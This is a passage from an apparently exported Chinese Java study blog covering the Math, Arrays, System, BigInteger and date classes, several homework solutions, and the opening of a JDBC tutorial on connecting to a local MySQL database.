StringBuilder\n- 2.如果字符串存在大量的修改操作，并在单线程的情况，使用 StringBuilder\n- 3.如果字符串存在大量的修改操作，并在多线程的情况，使用 StringBuffer\n- 4.如果我们字符串很少修改，被多个对象引用，使用 String，比如配置信息等\n\n## Math类\n\n- Math.abs() //绝对值\n- Math.pow() //求幂\n- Math.ceil() //向上取整,返回>=该参数的最小整数\n- Math.floor() //向下取整，返回<=该参数的最大整数(转成double)\n- Math.round() //四舍五入\n- Math.sqrt() //求开方\n- Math.random() //求随机数,返回的是 [0,1) 之间的一个随机小数\n- Math.min() //返回最小值\n- Math.max() //返回最大值\n\n```java\npackage com.jwt.math_;\n\npublic class MathMethod {\n    public static void main(String[] args) {\n        //看看Math 常用的方法(静态方法)\n        //1.abs 绝对值\n        int abs = Math.abs(-9);\n        System.out.println(abs);//9\n        //2.pow 求幂\n        double pow = Math.pow(2,4);//2 的4 次方\n        System.out.println(pow);//16\n        //3.ceil 向上取整,返回>=该参数的最小整数(转成double);\n        double ceil = Math.ceil(3.9);\n        System.out.println(ceil);//4.0\n        //4.floor 向下取整，返回<=该参数的最大整数(转成double)\n        double floor = Math.floor(4.001);\n        System.out.println(floor);//4.0\n        //5.round 四舍五入\n        long round = Math.round(5.51);\n        System.out.println(round);//6\n        //6.sqrt 求开方\n        double sqrt = Math.sqrt(9.0);\n        System.out.println(sqrt);//3.0\n        //7.random 求随机数 random 返回的是 [0,1) 之间的一个随机小数\n        //1).返回的是[0,1) 之间的一个随机小数\n        System.out.println(Math.random());\n        //2).返回的是[0,6) 之间的一个随机整数\n        System.out.println((int)(Math.random() * 6));\n        //3).返回的是[2,7] 之间的一个随机整数\n        //公式:(int)(a + Math.random() * (b-a +1) )\n        System.out.println((int)(2 + Math.random() * (7 - 2 + 1)));\n        //8.max , min 返回最大值和最小值\n        int min = Math.min(1, 9);\n        int max = Math.max(45, 90);\n        System.out.println(\"min=\" + min);\n        System.out.println(\"max=\" + max);\n    }\n\n}\n```\n\n## Arrays类\n\nArrays 里面包含了一系列静态方法，用于管理或操作数組(比如排序和捜索)。\n- toString() 返回数組的字符串形式\n\n```java\nInteger[] integers = {1, 20, 90};\n//遍历数组\nfor(int i = 0; i < integers.length; i++) {\n\tSystem.out.println(integers[i]);\n}\n\n//直接使用Arrays.toString 方法，显示数组\nSystem.out.println(Arrays.toString(integers));\n```\n\n- sort() 排序(默认排序和定制排序)\n\n```java\n//演示sort 方法的使用\nInteger arr3[] = {1, -1, 7, 0, 89};\n//默认排序\nArrays.sort(arr3);//默认升序\nSystem.out.println(\"===排序后===\");\nSystem.out.println(Arrays.toString(arr3));\n\n//定制排序\nArrays.sort(arr, new Comparator() {\n  @Override\n  public int compare(Object o1, Object o2) {\n    Integer i1 = (Integer) o1;\n    Integer i2 = (Integer) o2;\n    return i2 - i1;\n  }\n});\nSystem.out.println(\"===排序后===\");\nSystem.out.println(Arrays.toString(arr));\n```\n\n- binarySearch() 通辻二分捜索法进行査找，要求必须先排好序\n\n```java\n//binarySearch 通过二分搜索法进行查找，要求该数组是有序的. 如果该数组是无序的，不能使用、\nInteger[] arr = {1, 2, 90, 123, 567};\nint index = Arrays.binarySearch(arr, 567);//如果数组中存在该元素，返回该元素下标\nint index2 = Arrays.binarySearch(arr, 568); //如果不存在该元素，返回 return -(low + 1);  low:该元素应该存在位置的下标\nSystem.out.println(\"index=\" + index);\nSystem.out.println(\"index2=\" + index2);\n```\n\n- copyOf() 数组元素复制\n\n```java\n//copyOf 数组元素的复制\n//1. 从arr 数组中，拷贝arr.length 个元素到newArr 数组中\n//2. 如果拷贝的长度> arr.length 就在新数组的后面增加null\n//3. 如果拷贝长度< 0 就抛出异常NegativeArraySizeException\n//4. 该方法的底层使用的是System.arraycopy()\nInteger[] arr = {1, 2, 90, 123, 567};\nInteger[] newArr = Arrays.copyOf(arr, arr.length);\nSystem.out.println(\"==拷贝执行完毕后==\");\nSystem.out.println(Arrays.toString(newArr));\n```\n\n- fill()数组元素的填充\n\n```java\n//fill 数组元素的填充，可以理解成是替换原理的元素\nInteger[] num = new Integer[]{9,3,2};\nArrays.fill(num, 99);\nSystem.out.println(\"==num 数组填充后==\");\nSystem.out.println(Arrays.toString(num));\n```\n\n- equals() 比较两个数组元素内容是否完全一致\n\n```java\n//equals 比较两个数组元素内容是否完全一致\nInteger[] arr = {1, 2, 90, 123, 567};\nInteger[] arr2 = {1, 2, 90, 123};\n//如果arr 和arr2 数组的元素一样，则返回true;不是完全一样，就返回false\nboolean equals = Arrays.equals(arr, arr2);\nSystem.out.println(\"equals=\" + equals);\n```\n\n- asList将一组值，转换成list\n\n```java\n//asList 将一组值，转换成list\n//1. asList 方法，会将(2,3,4,5,6,1)数据转成一个List 集合\n//2. 返回的asList 编译类型List(接口)\n//3. asList 运行类型java.util.Arrays#ArrayList, 是Arrays 类的\nList asList = Arrays.asList(2,3,4,5,6,1);\nSystem.out.println(\"asList=\" + asList);\nSystem.out.println(\"asList 的运行类型\" + asList.getClass());\n```\n\n**练习**\n\n自定义 Book 类，里面包含 name 和 price，有 4本书对象，按 price 排序，要求(1)从大到小(2)从小到大(3)按照书名长度从大到小\n\nBook[] books = new Book[4];\nbooks[0] = new Book(\"红楼梦\", 100);\nbooks[1] = new Book(\"西游记\", 90);\nbooks[2] = new Book(\"青年文摘20年\"，5);\nbooks[3] = new Book(\"java从入门到放弃\"，300);\n\n```java\npackage com.jwt.arrays_;\n\nimport java.util.Arrays;\nimport java.util.Comparator;\n\npublic class ArraysExercise {\n    public static void main(String[] args) {\n        Book[] books = new Book[4];\n        books[0] = new Book(\"红楼梦\", 100);\n        books[1] = new Book(\"西游记~\", 90);\n        books[2] = new Book(\"青年文摘20年\",5);\n        books[3] = new Book(\"java从入门到放弃\",300);\n        //(1)price从大到小\n        Arrays.sort(books, new Comparator<Book>() {\n            @Override\n            public int compare(Book o1, Book o2) {\n                int priceVal = o2.getPrice() - o1.getPrice();\n                if(priceVal > 0) {\n                     return 1;\n                } else if(priceVal < 0) {\n                     return -1;\n                } else {\n                     return 0;\n                }\n            }\n        });\n        System.out.println(\"price从大到小：\" + Arrays.toString(books));\n\n        //(2)price从小到大\n        Arrays.sort(books, new Comparator<Book>() {\n            @Override\n            public int compare(Book o1, Book o2) {\n                int priceVal = o1.getPrice() - o2.getPrice();\n                if(priceVal > 0) {\n                    return 1;\n                } else if(priceVal < 0) {\n                    return -1;\n                } else {\n                    return 0;\n                }\n            }\n        });\n        System.out.println(\"price从小到大：\" + Arrays.toString(books));\n        \n        //(3)书名长度从大到小\n        Arrays.sort(books, new Comparator<Book>() {\n            @Override\n            public int compare(Book o1, Book o2) {\n                return o2.getName().length() - o1.getName().length();\n            }\n        });\n        System.out.println(\"书名长度从大到小：\" + Arrays.toString(books));\n    }\n}\n\nclass Book{\n    private String name;\n    private int price;\n\n    public Book(String name, int price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getPrice() {\n        return price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book{\" +\n                \"name='\" + name + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n}\n```\n\n## System类\n\n- arraycopy(src,srcPos,dest,destPos,length) ：复制数组元素\n  -  src：源数组\n  - srcPos：从源数组的哪个索引位置开始拷贝\n  - dest: 目标数组，即把源数组的数据拷贝到哪个数组\n  - destPos: 把源数组的数据拷贝到目标数组的哪个索引\n  - length: 从源数组拷贝多少个数据到目标数组\n- currentTimeMillens()：返回当前时间距离 1970-1-1 的毫秒数\n- exit()：退出当前程序\n- gc()：运行垃圾回收机制\n\n```java\npackage com.jwt.system_;\n\nimport java.util.Arrays;\n\npublic class System_ {\n    public static void main(String[] args) {\n\n        //arraycopy ：复制数组元素，比较适合底层调用，\n        // 一般使用Arrays.copyOf 完成复制数组\n        int[] src={1,2,3};\n        int[] dest = new int[3];// dest 当前是{0,0,0}\n        System.arraycopy(src, 0, dest, 0, src.length);\n        System.out.println(\"dest=\" + Arrays.toString(dest));//[1, 2, 3]\n\n        //currentTimeMillens:返回当前时间距离1970-1-1 的毫秒数\n        System.out.println(System.currentTimeMillis());\n\n        //exit 退出当前程序\n         System.out.println(\"ok1\");\n         System.exit(0); //exit(0) 表示程序退出\n         System.out.println(\"ok2\");\n    }\n}\n```\n\n## BigInteger类\n\nBigInteger 适合保存比较大的整型，当需要处理很大的整数，long 不够用可以使用 BigInteger 的类来搞定\n\n在对 BigInteger 进行加减乘除的时候，需要使用对应的方法，不能直接进行 `+ - * /`\n\n- add() //加\n- subtract() //减\n- multiply() //乘\n- divide() //除\n\n```java\npackage com.jwt.bignum;\n\nimport java.math.BigInteger;\npublic class BigInteger_ {\n    public static void main(String[] args) {\n        // long l = 23788888899999999999999999999L;//报错\n        // System.out.println(\"l=\" + l);//报错\n        BigInteger bigInteger = new BigInteger(\"23788888899999999999999999999\");\n        System.out.println(bigInteger);\n\n        //在对BigInteger 进行加减乘除的时候，需要使用对应的方法，不能直接进行+ - * /\n        BigInteger bigInteger2 = new BigInteger(\"10099999999999999999999999999999999999999999999999999999999999999999999999999999999\");\n        BigInteger add = bigInteger.add(bigInteger2);\n        System.out.println(add);//加\n        BigInteger subtract = bigInteger.subtract(bigInteger2);\n        System.out.println(subtract);//减\n        BigInteger multiply = bigInteger.multiply(bigInteger2);\n        System.out.println(multiply);//乘\n        BigInteger divide = bigInteger.divide(bigInteger2);\n        System.out.println(divide);//除\n    }\n}\n}\n```\n\n## BigDecimal类\n\nBigDecimal 适合保存精度更高的浮点型(小数)，当我们需要保存一个精度很高的数时，double 不够用，可以用 BigDecimal\n\n```java\npackage com.jwt.bignum;\n\nimport java.math.BigDecimal;\n\npublic class BigDecimal_ {\n    public static void main(String[] args) {\n         double d = 1999.11111111111999999999999977788d;\n         System.out.println(d);//损失精度\n         BigDecimal bigDecimal = new BigDecimal(\"1999.11111111111999999999999977788\");\n         System.out.println(bigDecimal);\n\n        //如果对BigDecimal 进行运算，比如加减乘除，需要使用对应的方法\n        BigDecimal bigDecimal2 = new BigDecimal(\"3\");\n        System.out.println(bigDecimal.add(bigDecimal2));//加\n        System.out.println(bigDecimal.subtract(bigDecimal2));//减\n        System.out.println(bigDecimal.multiply(bigDecimal2));//乘\n\t\t\t\t\t//System.out.println(bigDecimal.divide(bigDecimal2));//可能抛出异常ArithmeticException\n        //在调用divide 方法时，指定精度即可. BigDecimal.ROUND_CEILING\n        //如果有无限循环小数，就会保留分子的精度\n        System.out.println(bigDecimal.divide(bigDecimal2, BigDecimal.ROUND_CEILING));//除\n    }\n}\n```\n\n## 日期类\n\n### 第一代日期类-Date类\n\n- Date：精确到毫秒，代表特定的瞬间\n\n- SimpleDateFormat:  格式化和解析日期的具体类。它允许进行格式化(日期->文本)、解析(文本->日期)和规范化\n  - SimpleDateFormat sdf = new SimpleDateFormat(格式);\n  - String str = sdf.format(日期对象); // 将Date -> 指定格式String\n  - Date parse = sdf.parse(s);//把String -> Date\n\n```java\npackage com.jwt.date_;\n\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n\npublic class Date01 {\n    public static void main(String[] args) throws ParseException {\n        //1. 获取当前系统时间\n        //2. 这里的Date 类是在java.util 包\n        //3. 默认输出的日期格式是国外的方式, 因此通常需要对格式进行转换\n        Date d1 = new Date(); //获取当前系统时间\n        System.out.println(\"当前日期=\" + d1);\n        Date d2 = new Date(9234567); //通过指定毫秒数得到时间\n        System.out.println(\"d2=\" + d2); //获取某个时间对应的毫秒数\n\n        //1. 创建SimpleDateFormat 对象，可以指定相应的格式\n        //2. 这里的格式使用的字母是规定好，不能乱写\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 hh:mm:ss E\");\n        String format = sdf.format(d1); // format:将日期转换成指定格式的字符串\n        System.out.println(\"当前日期=\" + format);\n\n        //1. 可以把一个格式化的String 转成对应的Date\n        //2. 转换得到的Date，还是国外的形式，如果希望指定格式输出，需要转换\n        //3. 在把String -> Date ， 使用的sdf 格式需要和你给的String 的格式一样，否则会抛出转换异常\n        //String s = \"1996 年01 月01 日10:20:30 星期一\";//会抛出转换异常\n        String s = \"1996年01月01日 10:20:30 星期一\";\n        Date parse = sdf.parse(s);//把String -> Date\n        System.out.println(parse);\n        System.out.println(\"parse=\" + sdf.format(parse));\n    }\n}\n```\n\n### 第二代日期类-Calendar类\n\nCalendar类是一个抽象类，它为特定瞬间与一组诸如 YEAR、MONTH、DAY_OF_MONTH、HOUR\n等日历字段的转换提供了一些方法。\n\n- Calendar 是一个抽象类， 并且构造器是private，可以通过getInstance() 来获取实例\n- Calendar 没有提供对应的格式化的类，因此需要程序员自己组合来输出(灵活)\n- 如果我们需要按照 24 小时进制来获取时间， Calendar.HOUR ==改成=> Calendar.HOUR_OF_DAY\n\n```java\npackage com.jwt.date_;\n\nimport java.util.Calendar;\n\npublic class Calendar_ {\n    public static void main(String[] args) {\n        //1.创建日历类对象\n        Calendar c = Calendar.getInstance();\n        System.out.println(\"c=\" + c);\n        //2.获取日历对象的某个日历字段\n        System.out.println(\"年：\" + c.get(Calendar.YEAR));\n        System.out.println(\"月：\" + (c.get(Calendar.MONTH) + 1));//+1因为Calendar 返回月时候，是按照0 开始编号\n        System.out.println(\"日：\" + c.get(Calendar.DAY_OF_MONTH));\n        System.out.println(\"小时：\" + c.get(Calendar.HOUR));//12小时制\n        System.out.println(\"小时：\" + c.get(Calendar.HOUR_OF_DAY));////24小时制\n        System.out.println(\"分钟：\" + c.get(Calendar.MINUTE));\n        System.out.println(\"秒：\" + c.get(Calendar.SECOND));\n        //Calender 没有专门的格式化方法，所以需要程序员自己来组合显示\n        System.out.println(c.get(Calendar.YEAR) + \"-\" + (c.get(Calendar.MONTH) + 1) + \"-\"\n                + c.get(Calendar.DAY_OF_MONTH) + \" \" + c.get(Calendar.HOUR_OF_DAY) + \":\"\n                + c.get(Calendar.MINUTE) + \":\" + c.get(Calendar.SECOND));\n\n    }\n\n}\n```\n\n### 第三代日期类-LocalDate类\n\n**前面两代日期类的不足分析**\nJDK 1.0 中包含了一个 java.util.Date 类，但是它的大多数方法已经在 JDK 1.1 引入 Calendar 类之后被弃用了。而 Calendar 也存在问题是: \n\n- 1)可变性：像日期和时间这样的类应该是不可变的。\n- 2)偏移性：Date 中的年份是从 1900 开始的，而月份都从0开始。\n- 3)格式化：格式化只对  Date 有用，Calendar则不行。\n- 4)此外，它们也不是线程安全的;不能处理闰秒等(每隔2天，多出1s)。\n\nLocalDate(日期/年月日)、LocalTime(时间/时分秒)、 LocalDateTime(日期时间/年月日时分秒) JDK8加入\n\n- LocalDate 只包含日期，可以获取日期字段\n- LocalTime 只包含时间， 可以获取时间字段\n- LocalDateTime 包含日期+时间，可以获取日期和时间字段\n- DateTimeFormatter 格式化日期\n  - Date TimeFormat dtf = DateTimeFormatter.ofPattern(格式);\n  - String str = dtf.format(日期对象);\n\n```java\npackage com.jwt.date_;\n\nimport java.time.LocalDate;\nimport java.time.LocalDateTime;\nimport java.time.LocalTime;\nimport java.time.format.DateTimeFormatter;\n\npublic class LocalDate_ {\n    public static void main(String[] args) {\n        //1. 使用now() 返回表示当前日期时间的对象\n        LocalDate now = LocalDate.now(); //获取年-月-日\n        LocalTime now2 = LocalTime.now();//获取到时:分:秒\n        LocalDateTime now3 = LocalDateTime.now();//获取年-月-日T时:分:秒\n        System.out.println(now);\n        System.out.println(now2);\n        System.out.println(now3);\n\n        //2. 使用DateTimeFormatter 对象来进行格式化\n        // 创建DateTimeFormatter 对象\n        DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\n        String format = dateTimeFormatter.format(now3);\n        System.out.println(\"格式化的日期=\" + format);\n        System.out.println(\"年=\" + now3.getYear());\n        System.out.println(\"月=\" + now3.getMonth());\n        System.out.println(\"月=\" + now3.getMonthValue());\n        System.out.println(\"日=\" + now3.getDayOfMonth());\n        System.out.println(\"时=\" + now3.getHour());\n        System.out.println(\"分=\" + now3.getMinute());\n        System.out.println(\"秒=\" + now3.getSecond());\n        //提供plusDays 和minusMinutes 方法可以对当前时间进行加或者减\n        //2天后是什么时候，年-月-日 时:分:秒\n        LocalDateTime localDateTime = now3.plusDays(2);\n        System.out.println(\"2 天后=\" + dateTimeFormatter.format(localDateTime));\n        //在5分钟前是什么时候，年-月-日 时:分:秒\n        LocalDateTime localDateTime2 = now3.minusMinutes(5);\n        System.out.println(\"5 分钟前日期=\" + dateTimeFormatter.format(localDateTime2));\n    }\n}\n```\n\n### Instant 时间戳\n\n以 Unix 元年 1970-01-01 00:00:00 到某个时间之间的毫秒值\n\n类似 Date，提供了一系列和 Date 类转换的方式\n\n```java\npackage com.jwt.date_;\n\nimport java.time.Instant;\nimport java.util.Date;\n\npublic class Instant_ {\n    public static void main(String[] args) {\n        //1.通过静态方法now() 获取表示当前时间戳的对象\n        Instant now = Instant.now();\n        System.out.println(now);\n        //2. 通过from 可以把Instant 转成Date\n        Date date = Date.from(now);\n        System.out.println(date);\n        //3. 通过date 的toInstant() 可以把date 转成Instant 对象\n        Instant instant = date.toInstant();\n        System.out.println(instant);\n    }\n}\n```\n\n## 本章练习\n\n### 1.编程题Homework01.java\n\n(1)将字符串中指定部分进行反转。比如将\"a**bede**f\"反转为\" a**edeb**f\"\n(2) 编写方法来实现  public static String reverse(String str, int start, int end)\n\n```java\npackage com.jwt.arrays_;\n\npublic class Homework01 {\n    public static void main(String[] args) {\n        String str = \"abedef\";\n        String reverse = null;\n        try {\n            reverse = reverse(str, 1, 4);\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n\n        System.out.println(\"转换后：\" + reverse);\n\n    }\n\n    public static String reverse(String str,int start,int end){\n        if (!(str != null && start >0 && start < end && end < str.length())){\n            throw new RuntimeException(\"参数有误\");\n        }\n        char[] chars = str.toCharArray();\n        char temp = ' ';\n        for (int i = start,j = end; start < end; start++,end--) {\n            temp = chars[start];\n            chars[start] = chars[end];\n            chars[end] = temp;\n        }\n        return new String(chars);\n    }\n}\n```\n\n### 2.编程题Homework02.java\n\n输入用户名、密码、邮箱，如果信息录入正确，则提示注册成功，否则生成异常对象，要求:\n\n- 用户名长度需为2或3或4\n- 要求密码的长度为6,且全是数字\n- 邮箱中需包含@和.并且@在.前面\n\n```java\npackage com.jwt.arrays_;\n\nimport java.util.Scanner;\n\npublic class Homework02 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入用户名：\");\n        String name = scanner.nextLine();\n        System.out.println(\"请输入密码：\");\n        String pwd = scanner.nextLine();\n        System.out.println(\"请输入邮箱：\");\n        String email = scanner.nextLine();\n        try {\n            userRegister(name,pwd,email);\n            System.out.println(\"注册成功\");\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n\n    }\n\n    public static void userRegister(String name,String pwd,String email){\n        //第一关\n        int namelen = name.length();\n        if (!(namelen >=2 && namelen <=4)){\n            throw new RuntimeException(\"用户名长度需为2或3或4\");\n        }\n        //第二关\n        if(!(pwd.length()==6 && isdig(pwd))){\n            throw new RuntimeException(\"要求密码的长度为6,且全是数字\");\n        }\n        //第三关\n        int i = email.indexOf('@');\n        int j = email.indexOf('.');\n        if (!(i > 0 && j > i)){\n            throw new RuntimeException(\"邮箱中需包含@和.并且@在.前面\");\n        }\n\n    }\n\n    public static boolean isdig(String str){\n        char[] chars = str.toCharArray();\n        for (int i = 0; i < chars.length; i++) {\n            if(Character.isDigit(chars[i]))\n                return true;\n        }\n        return false;\n    }\n}\n```\n\n### 3.编程题Homework03.java\n\n(1)编写java程序，输入形式为: Han shun Ping的人名，以Ping, Han .S的形式打印出来。其中.S是中间单词的首字母。\n(2)例如输入\"Willian Jefferson Clinton\"，输出形式为: Clinton, Willian .J\n\n```java\n//我写的辣鸡代码\npackage com.jwt.arrays_;\nimport java.util.Scanner;\npublic class Homework03 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入名字：\");\n        String s = scanner.nextLine();\n        String[] s1 = s.split(\" \");\n        char[] chars = s1[1].toCharArray();\n        System.out.println(s1[2] + \" ,\" + s1[0] + \" .\" + Character.toUpperCase(chars[0]));\n    }\n}\n\n//标准答案\npackage com.jwt.arrays_;\nimport java.util.Scanner;\npublic class Homework03 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入名字：\");\n        String str = scanner.nextLine();\n        try {\n            printName(str);\n        } catch (Exception e) {\n            System.out.println(e.getMessage());\n        }\n    }\n    public static void printName(String str){\n        if (str == null){\n            throw new RuntimeException(\"str 不能为空\");\n        }\n        String[] name = str.split(\" \");\n        if (name.length != 3){\n            throw new RuntimeException(\"str 格式错误\");\n        }\n        String format = String.format(\"%s,%s .%c\", name[2], name[0], name[1].toUpperCase().charAt(0));\n        System.out.println(format);\n    }\n\n}\n\n```\n\n### 4.编程题Homework04.java\n\n输入字符串，判断里面有多少个大写字母，多少个小写字母，多少个字母，多少个数字\n\n```java\npackage com.jwt.arrays_;\n\nimport java.util.Scanner;\npublic class Homework04 {\n    //输入字符串，判断里面有多少个大写字母，多少个小写字母，多少个数字\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入：\");\n        String s = scanner.nextLine();\n        char[] chars = s.toCharArray();\n        int Upcount = 0 ;\n        int Lowcount = 0 ;\n        int LetNum = 0;\n        int DigNum = 0;\n        for (int i = 0; i < chars.length; i++) {\n            if(Character.isUpperCase(chars[i]))\n                Upcount++;\n            if(Character.isLowerCase(chars[i]))\n                Lowcount++;\n            if(Character.isLetter(chars[i]))\n                LetNum++;\n            if(Character.isDigit(chars[i]))\n                DigNum++;\n        }\n        System.out.println(\"大写字母个数：\"+ Upcount);\n        System.out.println(\"小写字母个数：\"+ Lowcount);\n        System.out.println(\"字母个数：\"+ LetNum);\n        System.out.println(\"数字个数：\"+ DigNum);\n    }\n}\n```\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["常用类"],"categories":["JavaSE"]},{"title":"Java-JDBC","url":"/posts/146.html","content":"\n### 前言\n\n哈喽！大家好，我是小简。今天开始学习《Java-JDBC》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计3天更新完\n- [x] 🎯开始时间：03-06\n- [x] 🎉结束时间：03-08\n- [x] 🍀总结：按时完成任务，继续下一个 🚩\n\n###  1.Java JDBC\n\n> JDBC的全称是Java数据库连接(Java DataBase Connectivity)，它是一套用于执行SQL语句的Java API。\n>\n> Java程序员使用JDBC可以连接任何提供了JDBC驱动程序的数据库系统，从而完成对数据库的各种操作。\n\nJava程序 JDBC API 使用 JDBC 驱动管理器并指定数据库的 JDBC 驱动器来提供与数据库的连接。\n\n![](https://img.jwt1399.top/img/jdbc-1720249.jpeg)**JDBC 程序实例**\n\n前置工作：\n\nMysql驱动下载：[MySQL :: Download Connector](https://dev.mysql.com/downloads/connector/j/)，选择操作系统：Platform Independent\n\n在项目下创建一个文件夹 libs 将下载的 mysql.jar 驱动拷贝到该目录下，在 IDEA 中右键点击 mysql.jar 选择 add to Library (加入到项目中)\n\n```java\npackage com.jwt.jdbc;\n\n\nimport com.mysql.jdbc.Driver;\n\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.sql.Statement;\nimport java.util.Properties;\n\npublic class myjdbc {\n    public static void main(String[] args) throws SQLException {\n        //1. 注册驱动\n        Driver driver = new Driver(); //创建driver 对象\n\n        //2. 得到连接\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        //将用户名和密码放入到Properties对象\n        Properties info = new Properties();\n        info.setProperty(\"user\", \"root\");// 用户\n        info.setProperty(\"password\", \"root\"); //密码\n        Connection connect = driver.connect(url, info);\n\n        //3. 执行sql\n        String sql = \"insert into jwt.jwt_info value (3,'Pyj') \";\n        //statement 用于执行静态SQL语句并返回其生成的结果的对象\n        Statement statement = connect.createStatement();\n        int rows = statement.executeUpdate(sql); // dml(update insert delete)语句，返回的就是影响行数\n        System.out.println(rows > 0 ? \"成功\" : \"失败\");\n\n        //4. 关闭连接资源\n        statement.close();\n        connect.close();\n    }\n}\n```\n\n### 2.五种连接方式\n\n#### 方式1\n\n```java\n //1. 注册驱动\n Driver driver = new Driver();\n String url = \"jdbc:mysql://localhost:3306/jwt\";\n //将用户名和密码放入到Properties对象\n Properties properties = new Properties();\n properties.setProperty(\"user\",\"root\");\n properties.setProperty(\"password\",\"root\");\n //2. 得到连接\n Connection connection = driver.connect(url, properties);\n```\n\n#### 方式2\n\n```java\n//使用反射加载Driver类, 动态加载，更加的灵活，减少依赖性\nClass<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\nDriver driver = (Driver) aClass.newInstance();\n//将用户名和密码放入到Properties对象\nString url = \"jdbc:mysql://localhost:3306/jwt\";\nProperties properties = new Properties();\nproperties.setProperty(\"user\",\"root\");\nproperties.setProperty(\"password\",\"root\");\n//得到连接\nConnection connection = driver.connect(url, properties);\n```\n\n#### 方式3\n\n```java\n//使用DriverManager替代driver进行统一管理\nClass<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\nDriver driver = (Driver) aClass.newInstance();\n//创建url 和user 和password\nString url = \"jdbc:mysql://localhost:3306/jwt\";\nString user = \"root\";\nString password = \"root\";\n//注册Driver驱动\nDriverManager.registerDriver(driver);\n//得到连接\nConnection connection = DriverManager.getConnection(url, user, password);\n```\n\n#### 方式4\n\n```java\n//使用Class.forName自动完成注册驱动，简化代码 \nClass.forName(\"com.mysql.jdbc.Driver\");\n//创建url 和user 和password\nString url = \"jdbc:mysql://localhost:3306/jwt\";\nString user = \"root\";\nString password = \"root\";\n//得到连接\nConnection connection = DriverManager.getConnection(url, user, password);\n```\n\n#### 方式5\n\n第一步：src下新建文件mysql.properties\n\n```\nurl=jdbc:mysql://localhost:3306/jwt\nuser=root\npassword=root\ndriver=com.mysql.jdbc.Driver\n```\n\n第二步：\n\n```java\n//在方式4的基础上改进，增加配置文件，让连接mysql更加灵活\n//通过Properties 对象获取配置文件的信息\nProperties properties = new Properties();\nproperties.load(new FileInputStream(\"src//mysql.properties\"));//windows路径的//改成\\\\\n//获取相关的值\nString url = properties.getProperty(\"url\");\nString user = properties.getProperty(\"user\");\nString password = properties.getProperty(\"password\");\nString driver = properties.getProperty(\"driver\");\n//1. 注册驱动\nClass.forName(driver);//建议写上\n//2. 得到连接\nConnection connection = DriverManager.getConnection(url, user, password);\n```\n\n#### 常用驱动程序名称和URL\n\n| DBMS       | JDBC驱动程序名称                | URL格式                                      |\n| ---------- | ------------------------------- | -------------------------------------------- |\n| MySQL      | com.mysql.jdbc.Driver           | jdbc:mysql://hostname:port/databaseName      |\n| Oracle     | oracle.jdbc.driver.OracleDriver | jdbc:oracle:thin:@hostname:port:databaseName |\n| PostgreSQL | org.postgresql.Driver           | jdbc:postgresql://hostname:port/dbname       |\n| DB2        | com.ibm.db2.jdbc.net.DB2Driver  | jdbc:db2:hostname:port/databaseName          |\n| Sybase     | com.sybase.jdbc.SybDriver       | jdbc:sybase:Tds:hostname: port/databaseName  |\n\n#### Junit测试\n\n```java\npackage com.jwt.jdbc;\n\nimport com.mysql.jdbc.Driver;\nimport org.junit.Test;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\nimport java.util.Properties;\n\npublic class jdbcConn {\n\n    //方式1\n    @Test\n    public void connect01() throws SQLException {\n        //1. 注册驱动\n        Driver driver = new Driver();\n        //2. 得到连接\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        Properties properties = new Properties();\n        properties.setProperty(\"user\",\"root\");\n        properties.setProperty(\"password\",\"root\");\n        Connection connection = driver.connect(url, properties);\n        System.out.println(\"第1种方式:\"+connection);\n    }\n\n    //方式2 使用反射加载Driver类\n    @Test\n    public void connect02() throws ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {\n        //使用反射加载Driver类, 动态加载，更加的灵活，减少依赖性\n        Class<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\n        Driver driver = (Driver) aClass.newInstance();\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        Properties properties = new Properties();\n        properties.setProperty(\"user\",\"root\");\n        properties.setProperty(\"password\",\"root\");\n        Connection connection = driver.connect(url, properties);\n        System.out.println(\"第2种方式:\"+connection);\n\n    }\n\n    //方式3 使用DriverManager 替代driver 进行统一管理\n    @Test\n    public  void connect03() throws ClassNotFoundException, InstantiationException, IllegalAccessException, SQLException {\n        //使用反射加载Driver\n        Class<?> aClass = Class.forName(\"com.mysql.jdbc.Driver\");\n        Driver driver = (Driver) aClass.newInstance();\n        //创建url 和user 和password\n        String url = \"jdbc:mysql://localhost:3306/jwt\";\n        String user = 